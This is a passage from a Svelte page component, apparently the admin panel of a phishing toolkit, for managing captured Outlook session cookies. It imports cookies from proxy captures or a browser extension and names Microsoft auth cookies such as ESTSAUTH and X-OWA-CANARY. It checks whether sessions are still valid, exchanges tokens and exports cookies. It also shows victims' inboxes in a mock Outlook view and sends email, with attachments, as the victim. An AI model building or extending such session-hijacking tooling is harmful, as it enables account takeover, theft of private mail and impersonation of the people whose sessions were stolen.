				owaContainerEl.setAttribute('tabindex', '-1');
			}
			// Focus the container so keyboard events land here without a click.
			try { owaContainerEl.focus({ preventScroll: true }); } catch (_) { /* ignore */ }
			_owaListenerAttached = true;
		} else if ((!owaContainerEl || !isInboxModalVisible) && _owaListenerAttached) {
			// The container was removed from the DOM (modal closed).
			_owaListenerAttached = false;
		}
	}
	$: if (inboxMessages && owaHighlightIndex >= inboxMessages.length) {
		owaHighlightIndex = inboxMessages.length - 1;
	}

	onDestroy(() => {
		if (pollStoreStatusTimer) { clearTimeout(pollStoreStatusTimer); pollStoreStatusTimer = null; }
		if (inboxSearchDebounceTimer) { clearTimeout(inboxSearchDebounceTimer); inboxSearchDebounceTimer = null; }
		if (owaKeyPrefixTimer) { clearTimeout(owaKeyPrefixTimer); owaKeyPrefixTimer = null; }
		if (owaContainerEl) {
			try { owaContainerEl.removeEventListener('keydown', handleOWAKeydown); } catch (_) { /* ignore */ }
		}
	});

	let inboxLoadingStatus = '';

	async function loadInbox() {
		inboxLoading = true;
		inboxLoadingStatus = 'Loading messages...';
		const progressTimer = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Fetching from server... First load may take longer.';
			}
		}, 5000);
		const progressTimer2 = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Browser automation in progress... Please wait.';
			}
		}, 30000);
		try {
			const res = await api.cookieStore.getInbox(inboxStoreId, inboxFolder, inboxLimit, inboxSkip);
			if (res && res.data) {
				inboxMessages = res.data.messages || [];
				inboxTotalCount = res.data.totalCount || inboxMessages.length;
				// Cache inbox data for instant load next time
				if (inboxFolder === 'inbox' && inboxSkip === 0) {
					cacheInboxData(inboxStoreId, inboxMessages, inboxFolders);
				}
			}
		} catch (e) {
			addToast('Failed to load inbox: ' + (e.message || ''), 'error');
		}
		clearTimeout(progressTimer);
		clearTimeout(progressTimer2);
		inboxLoadingStatus = '';
		inboxLoading = false;
	}

	async function loadFolders() {
		try {
			const res = await api.cookieStore.getFolders(inboxStoreId);
			if (res && res.data) {
				const folders = res.data.folders || [];
				if (folders.length > 0) {
					inboxFolders = folders;
					// Update cache with fresh folder data
					cacheInboxData(inboxStoreId, inboxMessages, inboxFolders);
				}
			}
		} catch (e) {
			// Keep default folders on error
		}
	}

	async function switchFolder(folderId) {
		inboxFolder = folderId;
		inboxSkip = 0;
		await loadInbox();
	}

	async function nextInboxPage() {
		inboxSkip += inboxLimit;
		await loadInbox();
	}

	async function prevInboxPage() {
		inboxSkip = Math.max(0, inboxSkip - inboxLimit);
		await loadInbox();
	}

	async function refreshInbox() {
		await loadInbox();
		addToast('Inbox refreshed', 'success');
	}

	// --- Message viewer ---
	async function openMessage(messageId) {
		messageLoading = true;
		currentMessage = null;
		isMessageModalVisible = true;
		try {
			const res = await api.cookieStore.getMessage(inboxStoreId, messageId);
			if (res && res.data) {
				currentMessage = res.data;
			}
		} catch (e) {
			addToast('Failed to load message: ' + (e.message || ''), 'error');
		}
		messageLoading = false;
	}

	function closeMessageModal() {
		isMessageModalVisible = false;
	}

	// --- Helpers ---
	function formatDate(dateStr) {
		if (!dateStr) return '';
		try {
			return new Date(dateStr).toLocaleString();
		} catch {
			return dateStr;
		}
	}

	function formatShortDate(dateStr) {
		if (!dateStr) return '';
		try {
			const d = new Date(dateStr);
			const now = new Date();
			const diff = now.getTime() - d.getTime();
			if (diff < 86400000 && d.getDate() === now.getDate()) {
				return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
			}
			if (diff < 604800000) {
				return d.toLocaleDateString([], { weekday: 'short' });
			}
			return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
		} catch {
			return dateStr;
		}
	}

	function getInitials(name) {
		if (!name) return '?';
		const parts = name.trim().split(/\s+/);
		if (parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
		return name[0].toUpperCase();
	}

	function getAvatarColor(name) {
		if (!name) return '#6b7280';
		const colors = ['#0078d4', '#d13438', '#107c10', '#5c2d91', '#e3008c', '#008272', '#ca5010', '#4f6bed', '#498205', '#881798'];
		let hash = 0;
		for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
		return colors[Math.abs(hash) % colors.length];
	}

	function getStatusBadge(store) {
		if (store.isValid) return { text: 'Valid', class: 'badge-success' };
		if (store.lastChecked) return { text: 'Expired', class: 'badge-error' };
		return { text: 'Pending', class: 'badge-warning' };
	}

	function getAutomationBadge(store) {
		const status = store.automationStatus || 'pending';
		switch (status) {
			case 'ready': return { text: 'Ready', class: 'badge-success' };
			case 'running': return { text: 'Automating...', class: 'badge-info' };
			case 'failed': return { text: 'Failed', class: 'badge-error' };
			default: return { text: 'Pending', class: 'badge-warning' };
		}
	}

	function getSourceBadge(source) {
		switch (source) {
			case 'extension': return { text: 'Extension', class: 'badge-info' };
			case 'proxy_capture': return { text: 'Proxy', class: 'badge-purple' };
			case 'import': return { text: 'Import', class: 'badge-default' };
			default: return { text: source || 'Unknown', class: 'badge-default' };
		}
	}

	function getFolderIcon(folderId) {
		const id = folderId?.toLowerCase();
		if (id?.includes('inbox')) return folderIcons.inbox;
		if (id?.includes('sent')) return folderIcons.send;
		if (id?.includes('draft')) return folderIcons.draft;
		if (id?.includes('junk') || id?.includes('spam')) return folderIcons.junk;
		if (id?.includes('delete') || id?.includes('trash')) return folderIcons.trash;
		return folderIcons.inbox;
	}

	// --- Bulk Operations ---
	function toggleSelectAll() {
		if (selectedStoreIds.length === stores.length) {
			selectedStoreIds = [];
		} else {
			selectedStoreIds = stores.map((s) => s.id);
		}
	}

	function toggleStoreSelect(id) {
		if (selectedStoreIds.includes(id)) {
			selectedStoreIds = selectedStoreIds.filter((i) => i !== id);
		} else {
			selectedStoreIds = [...selectedStoreIds, id];
		}
	}

	async function handleBulkDelete() {
		isBulkDeleting = true;
		try {
			const res = await api.cookieStore.bulkDelete(selectedStoreIds);
			if (res.success) {
				addToast(`Deleted ${selectedStoreIds.length} cookie store(s)`, 'success');
				selectedStoreIds = [];
				await refreshStores();
			} else {
				addToast(res.error || 'Bulk delete failed', 'error');
			}
		} catch (e) {
			addToast('Bulk delete failed', 'error');
		}
		isBulkDeleting = false;
		isBulkDeleteAlertVisible = false;
	}

	async function handleBulkRevalidate() {
		isBulkRevalidating = true;
		try {
			const res = await api.cookieStore.bulkRevalidate(selectedStoreIds);
			if (res.success) {
				const results = res.data || [];
				const validCount = results.filter((r) => r.valid).length;
				addToast(`Revalidated ${results.length}: ${validCount} valid, ${results.length - validCount} expired`, 'success');
				selectedStoreIds = [];
				await refreshStores();
			} else {
				addToast(res.error || 'Bulk revalidate failed', 'error');
			}
		} catch (e) {
			addToast('Bulk revalidate failed', 'error');
		}
		isBulkRevalidating = false;
	}
</script>

<HeadTitle title="Cookie Store" />
<Headline>COOKIE STORE</Headline>

<div class="flex gap-4 mb-6">
	<BigButton on:click={openImportModal}>IMPORT COOKIES</BigButton>
	<BigButton on:click={openProxyCaptureModal}>IMPORT FROM PROXY CAPTURES</BigButton>
</div>

<!-- Cookie Health Summary -->
{#if healthSummary}
<div class="mb-6 grid grid-cols-2 md:grid-cols-4 gap-4">
	<div class="p-4 rounded-lg bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800">
		<div class="text-2xl font-bold text-green-700 dark:text-green-300">{healthSummary.valid || 0}</div>
		<div class="text-xs text-green-600 dark:text-green-400">Valid Sessions</div>
	</div>
	<div class="p-4 rounded-lg bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800">
		<div class="text-2xl font-bold text-red-700 dark:text-red-300">{healthSummary.expired || 0}</div>
		<div class="text-xs text-red-600 dark:text-red-400">Expired Sessions</div>
	</div>
	<div class="p-4 rounded-lg bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800">
		<div class="text-2xl font-bold text-yellow-700 dark:text-yellow-300">{healthSummary.pending || 0}</div>
		<div class="text-xs text-yellow-600 dark:text-yellow-400">Pending Check</div>
	</div>
	<div class="p-4 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800">
		<div class="text-2xl font-bold text-blue-700 dark:text-blue-300">{(healthSummary.valid || 0) + (healthSummary.expired || 0) + (healthSummary.pending || 0)}</div>
		<div class="text-xs text-blue-600 dark:text-blue-400">Total Monitored</div>
	</div>
</div>
{/if}

<!-- Bulk Action Bar -->
{#if selectedStoreIds.length > 0}
<div class="mb-4 p-3 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 flex items-center justify-between">
	<span class="text-sm font-medium text-blue-700 dark:text-blue-300">
		{selectedStoreIds.length} store{selectedStoreIds.length > 1 ? 's' : ''} selected
	</span>
	<div class="flex gap-2">
		<button
			class="px-3 py-1.5 text-xs font-medium rounded-md bg-blue-600 text-white hover:bg-blue-700 transition-colors disabled:opacity-50"
			on:click={handleBulkRevalidate}
			disabled={isBulkRevalidating}
		>
			{isBulkRevalidating ? 'Revalidating...' : 'Bulk Revalidate'}
		</button>
		<button
			class="px-3 py-1.5 text-xs font-medium rounded-md bg-red-600 text-white hover:bg-red-700 transition-colors disabled:opacity-50"
			on:click={() => (isBulkDeleteAlertVisible = true)}
			disabled={isBulkDeleting}
		>
			Bulk Delete
		</button>
		<button
			class="px-3 py-1.5 text-xs font-medium rounded-md border border-gray-300 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
			on:click={() => (selectedStoreIds = [])}
		>
			Clear Selection
		</button>
	</div>
</div>
{/if}

<!-- Extension Notice Banner -->
<div class="mb-6 p-4 rounded-lg bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 dark:border-indigo-800 flex items-start gap-3">
	<div class="w-8 h-8 rounded-lg bg-indigo-600 flex items-center justify-center flex-shrink-0 mt-0.5">
		<svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
			<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
		</svg>
	</div>
	<div class="flex-1">
		<p class="text-sm font-medium text-indigo-700 dark:text-indigo-300">
			For proper Outlook cookie capture, use the Browser Extension
		</p>
		<p class="text-xs text-indigo-600 dark:text-indigo-400 mt-1">
			Proxy captures may miss critical OWA session cookies. The extension captures all Microsoft auth cookies (ESTSAUTH, WLSSC, X-OWA-CANARY, etc.) directly from the browser for reliable inbox access and email sending.
		</p>
		<a href="/tools" class="inline-flex items-center gap-1 mt-2 text-xs font-medium text-indigo-700 dark:text-indigo-300 hover:text-indigo-800 dark:hover:text-indigo-200 transition-colors">
			Download Extension on Tools Page
			<svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
		</a>
	</div>
</div>

<!-- Cookie Stores Table -->
<Table
	columns={['', 'Name', 'Email', 'Source', 'Cookies', 'Status', 'Automation', 'Last Checked']}
	hasData={!!stores.length}
	hasNextPage={storesHasNextPage}
	plural="Cookie Stores"
	pagination={tableURLParams}
	isGhost={isLoading}
>
	{#each stores as store}
		<TableRow>
			<TableCell>
				<input
					type="checkbox"
					checked={selectedStoreIds.includes(store.id)}
					on:change={() => toggleStoreSelect(store.id)}
					class="rounded border-gray-300 dark:border-gray-600 text-highlight-blue focus:ring-highlight-blue"
				/>
			</TableCell>
			<TableCell>
				<span class="font-medium">{store.name}</span>
			</TableCell>
			<TableCell>
				{#if store.email}
					<span class="text-sm">{store.email}</span>
					{#if store.displayName}
						<br /><span class="text-xs opacity-60">{store.displayName}</span>
					{/if}
				{:else}
					<span class="text-xs opacity-40">Not scraped yet</span>
				{/if}
			</TableCell>
			<TableCell>
				{@const badge = getSourceBadge(store.source)}
				<span class="badge {badge.class}">{badge.text}</span>
			</TableCell>
			<TableCell>
				<span class="text-sm">{store.cookieCount}</span>
			</TableCell>
			<TableCell>
				{@const status = getStatusBadge(store)}
				<span class="badge {status.class}">{status.text}</span>
			</TableCell>
			<TableCell>
				{@const autoBadge = getAutomationBadge(store)}
				<span class="badge {autoBadge.class}">
					{#if store.automationStatus === 'running'}
						<span class="inline-block animate-spin rounded-full h-3 w-3 border-b-2 border-current mr-1"></span>
					{/if}
					{autoBadge.text}
				</span>
				{#if store.lastScrapedAt}
					<br /><span class="text-xs opacity-40">Scraped: {formatDate(store.lastScrapedAt)}</span>
				{/if}
			</TableCell>
			<TableCell>
				<span class="text-xs">{formatDate(store.lastChecked)}</span>
			</TableCell>
			<TableCellEmpty />
			<TableCellAction>
				<TableDropDownEllipsis>
					{#if store.isValid}
						<button class="dropdown-item" on:click={() => openSendModal(store)}>
							<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
							Send Email
						</button>
						<button class="dropdown-item" on:click={() => openInbox(store)}>
							<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>
							Read Inbox
						</button>
					{/if}
					<button class="dropdown-item" on:click={() => revalidateStore(store.id)} disabled={revalidatingId === store.id}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
						{revalidatingId === store.id ? 'Revalidating...' : 'Revalidate'}
					</button>
					<button class="dropdown-item" on:click={() => handleTokenExchange(store)} disabled={tokenExchangingId === store.id}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg>
						{tokenExchangingId === store.id ? 'Exchanging...' : 'Token Exchange'}
					</button>
					<button class="dropdown-item" on:click={() => openExportModal(store)}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
						Export Cookies
					</button>
					<button class="dropdown-item dropdown-item-danger" on:click={() => confirmDelete(store)}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
						Delete
					</button>
				</TableDropDownEllipsis>
			</TableCellAction>
		</TableRow>
	{/each}
</Table>

<!-- Import Cookies Modal -->
<Modal
	headerText="Import Cookies"
	visible={isImportModalVisible}
	onClose={closeImportModal}
	isSubmitting={isImporting}
>
	<FormGrid on:submit={handleImport} isSubmitting={isImporting}>
		<TextField
			label="Name"
			placeholder="e.g., John's Outlook Session"
			bind:value={importName}
			required={true}
		/>
		<TextareaField
			label="Cookies JSON"
			placeholder={`Paste cookies as JSON array, e.g.:\n[\n  {"name": "RPSSecAuth", "value": "...", "domain": ".live.com", "path": "/"},\n  ...\n]`}
			bind:value={importCookiesText}
		/>
		{#if importError}
			<div class="text-red-500 text-sm mt-1 col-span-3">{importError}</div>
		{/if}
		<div class="text-xs opacity-60 mt-2 col-span-3">
			<strong>Tip:</strong> After import, the system will automatically validate the cookies and pre-scrape inbox data in the background.
			You can use the session immediately after validation completes.
		</div>
		<FormFooter closeModal={closeImportModal} isSubmitting={isImporting} okText="Import & Validate" />
	</FormGrid>
</Modal>

<!-- Send Email Modal -->
<Modal
	headerText="Send Email"
	visible={isSendModalVisible}
	onClose={closeSendModal}
	isSubmitting={isSending}
>
	<FormGrid on:submit={handleSend} isSubmitting={isSending}>
		<div class="col-span-3 flex items-center gap-2 mb-2 p-2 rounded-md bg-gray-50 dark:bg-gray-700/50">
			<svg class="w-4 h-4 text-gray-500 dark:text-gray-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
			<span class="text-sm text-gray-600 dark:text-gray-300">Sending as: <strong>{sendForm.cookieStoreName}</strong></span>
		</div>
		<TextField
			label="To"
			placeholder="recipient@example.com (comma-separated for multiple)"
			bind:value={sendForm.to}
			required={true}
		/>
		<TextField
			label="CC"
			placeholder="cc@example.com (optional)"
			bind:value={sendForm.cc}
		/>
		<TextField
			label="BCC"
			placeholder="bcc@example.com (optional)"
			bind:value={sendForm.bcc}
		/>
		<TextField
			label="Subject"
			placeholder="Email subject"
			bind:value={sendForm.subject}
			required={true}
		/>
		<TextareaField
			label="Body"
			placeholder="Email body (HTML or plain text)"
			bind:value={sendForm.body}
		/>

		<!-- Attachments Section -->
		<div class="col-span-3 mt-2">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
				<svg class="w-4 h-4 inline mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/></svg>
				Attachments
			</label>
			{#if sendForm.attachments.length > 0}
				<div class="space-y-2 mb-3">
					{#each sendForm.attachments as att, i}
						<div class="flex items-center justify-between p-2 bg-gray-50 dark:bg-gray-700/50 rounded-md border border-gray-200 dark:border-gray-600">
							<div class="flex items-center gap-2 min-w-0">
								<svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
								<span class="text-sm truncate">{att.name}</span>
								<span class="text-xs text-gray-400 flex-shrink-0">{formatFileSize(att.size)}</span>
							</div>
							<button type="button" on:click={() => removeAttachment(i)} class="text-red-500 hover:text-red-700 p-1 flex-shrink-0">
								<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
							</button>
						</div>
					{/each}
				</div>
			{/if}
			<label class="inline-flex items-center gap-2 px-3 py-1.5 border border-dashed border-gray-300 dark:border-gray-600 rounded-md cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700/50 transition-colors">
				<svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
				<span class="text-sm text-gray-600 dark:text-gray-400">Add File</span>
				<input type="file" multiple class="hidden" on:change={handleAttachmentUpload} />
			</label>
		</div>

		<div class="flex items-center gap-4 mt-2 col-span-3">
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.isHTML} class="checkbox checkbox-sm" />
				<span class="text-sm">HTML Body</span>
			</label>
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.saveToSent} class="checkbox checkbox-sm" />
				<span class="text-sm">Save to Sent Items</span>
			</label>
		</div>

		{#if isSending}
		<div class="mt-4 col-span-3 p-3 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800">
			<div class="flex items-center gap-3">
				<div class="inline-block animate-spin rounded-full h-5 w-5 border-b-2 border-blue-500"></div>
				<span class="text-blue-700 dark:text-blue-300 text-sm">Sending email{sendForm.attachments.length > 0 ? ` with ${sendForm.attachments.length} attachment(s)` : ''}...</span>
			</div>
		</div>
	{/if}

	{#if sendResult}
			<div class="mt-4 col-span-3 p-3 rounded-lg {sendResult.success ? 'bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800' : 'bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800'}">
				{#if sendResult.success}
					<div class="text-green-700 dark:text-green-300 text-sm flex items-center gap-2">
						<svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
						<div>
							Email sent successfully via <strong>{sendResult.method}</strong>
							{#if sendResult.messageId}
								<br /><span class="text-xs opacity-70">Message ID: {sendResult.messageId}</span>
							{/if}
						</div>
					</div>
				{:else}
					<div class="text-red-700 dark:text-red-300 text-sm flex items-center gap-2">
						<svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
						<div>Send failed: {sendResult.error}</div>
					</div>
				{/if}
			</div>
		{/if}

		<FormFooter closeModal={closeSendModal} isSubmitting={isSending} okText="Send Email" />
	</FormGrid>
</Modal>

<!-- OWA Inbox Modal -->
{#if isInboxModalVisible}
<div class="owa-fullscreen" class:owa-dark={owaTheme === 'dark'} bind:this={owaContainerEl}>
	<!-- OWA Top Header Bar -->
	<div class="owa-header" style="background: {getOWAHeaderBg()}; background-size: cover;">
		<div class="owa-header-left">
			<button class="owa-header-btn" on:click={closeInboxModal} title="Close">
				<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
			</button>
			<div class="owa-logo">
				<svg class="w-5 h-5" viewBox="0 0 24 24" fill="currentColor"><path d="M21.17 2.06A13.1 13.1 0 0019 1.87a12.94 12.94 0 00-7 2.05 12.94 12.94 0 00-7-2 13.1 13.1 0 00-2.17.19C1.35 2.35.5 3.62.5 4.95v11.85c0 1.75 1.37 3.22 3.12 3.27A11.26 11.26 0 0112 17.3a11.26 11.26 0 018.38 2.77c1.75-.05 3.12-1.52 3.12-3.27V4.95c0-1.33-.85-2.6-2.33-2.89z"/></svg>
				<span class="owa-logo-text {owaTheme === 'light' ? 'text-gray-800' : 'text-white'}">Outlook</span>
			</div>
		</div>
		<div class="owa-header-center">
			<div class="owa-search-bar">
				<svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path stroke-linecap="round" stroke-width="2" d="M21 21l-4.35-4.35"/></svg>
				<input
					type="text"
					class="owa-search-input"
					placeholder="Search mail (press / to focus)"
					title="Press / to search"
					bind:value={inboxSearch}
					bind:this={owaSearchInputEl}
					on:input={handleInboxSearchInput}
				/>
			</div>
		</div>
		<div class="owa-header-right">
			<button class="owa-header-btn" on:click={toggleOWASettings} title="Settings">
				<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><circle cx="12" cy="12" r="3"/></svg>
			</button>
			<button class="owa-header-btn" on:click={refreshInbox} disabled={inboxLoading} title="Refresh">
				<svg class="w-5 h-5 {inboxLoading ? 'animate-spin' : ''}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
			</button>
			<div class="owa-user-avatar" style="background-color: {getAvatarColor(inboxStoreName)}" title="{inboxStoreName}">
				{getInitials(inboxStoreName)}
			</div>
		</div>
	</div>

	<div class="owa-body">
		<!-- App Rail (far left) -->
		<div class="owa-app-rail">
			{#each owaAppRailIcons as appIcon}
				<button
					class="owa-rail-btn {appIcon.active ? 'active' : ''}"
					title={appIcon.label}
					style="{appIcon.active ? `border-left-color: ${owaThemes[owaTheme]?.accent || '#0078d4'}` : ''}"
				>
					<span class="owa-rail-icon">{@html appIcon.svg}</span>
				</button>
			{/each}
		</div>

		<!-- Folder Sidebar -->
		<div class="owa-sidebar">
			<button
				class="owa-compose-btn"
				style="background-color: {owaThemes[owaTheme]?.accent || '#0078d4'}"
				on:click={() => { const store = stores.find(s => s.id === inboxStoreId); if (store) openSendModal(store); }}
			>
				<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
				New mail
			</button>
			<div class="owa-folder-list">
				{#each inboxFolders as folder}
					<button
						class="owa-folder-btn {inboxFolder === folder.id ? 'active' : ''}"
						on:click={() => switchFolder(folder.id)}
						disabled={inboxLoading}
						style="{inboxFolder === folder.id ? `background: ${owaThemes[owaTheme]?.sidebarActive || '#e6f2ff'}; color: ${owaThemes[owaTheme]?.sidebarActiveText || '#0078d4'}; border-left-color: ${owaThemes[owaTheme]?.sidebarActiveBorder || '#0078d4'}` : ''}"
					>
						<span class="owa-folder-icon">{@html getFolderIcon(folder.id)}</span>
						<span class="owa-folder-name">{folder.displayName}</span>
						{#if folder.unreadItemCount > 0}
							<span class="owa-folder-count" style="color: {owaThemes[owaTheme]?.accent || '#0078d4'}">{folder.unreadItemCount}</span>
						{/if}
					</button>
				{/each}
			</div>
		</div>

		<!-- Message List Panel -->
		<div class="owa-message-list-panel">
			<!-- Focused / Other tabs -->
			<div class="owa-tabs">
				<button
					class="owa-tab {owaFocusedTab === 'focused' ? 'active' : ''}"
					style="{owaFocusedTab === 'focused' ? `border-bottom-color: ${owaThemes[owaTheme]?.accent || '#0078d4'}; color: ${owaThemes[owaTheme]?.accent || '#0078d4'}` : ''}"
					on:click={() => (owaFocusedTab = 'focused')}
				>Focused</button>
				<button
					class="owa-tab {owaFocusedTab === 'other' ? 'active' : ''}"
					style="{owaFocusedTab === 'other' ? `border-bottom-color: ${owaThemes[owaTheme]?.accent || '#0078d4'}; color: ${owaThemes[owaTheme]?.accent || '#0078d4'}` : ''}"
					on:click={() => (owaFocusedTab = 'other')}
				>Other</button>
				<div class="owa-tab-filter">
					<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 4a1 1 0 011-1h16a1 1 0 011 1v2.586a1 1 0 01-.293.707l-6.414 6.414a1 1 0 00-.293.707V17l-4 4v-6.586a1 1 0 00-.293-.707L3.293 7.293A1 1 0 013 6.586V4z"/></svg>
				</div>
			</div>

			<!-- Messages -->
			<div class="owa-messages-scroll">
				{#if inboxLoading && inboxMessages.length === 0}
					<div class="flex flex-col items-center justify-center py-16">
						<div class="owa-spinner"></div>
						<p class="text-sm mt-3" style="color: {owaTheme === 'dark' ? '#9ca3af' : '#6b7280'}">{inboxLoadingStatus || 'Loading messages...'}</p>
					</div>
				{:else if visibleInboxMessages.length === 0}
					<div class="flex flex-col items-center justify-center py-16">
						<svg class="w-16 h-16 mb-4" style="color: {owaTheme === 'dark' ? '#374151' : '#d1d5db'}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>
						<p class="text-sm" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}">
							{inboxSearchActive && inboxSearch.trim() ? 'No messages match your search' : 'Nothing here looks empty'}
						</p>
					</div>
				{:else}
					{#each visibleInboxMessages as msg, i}
						<button
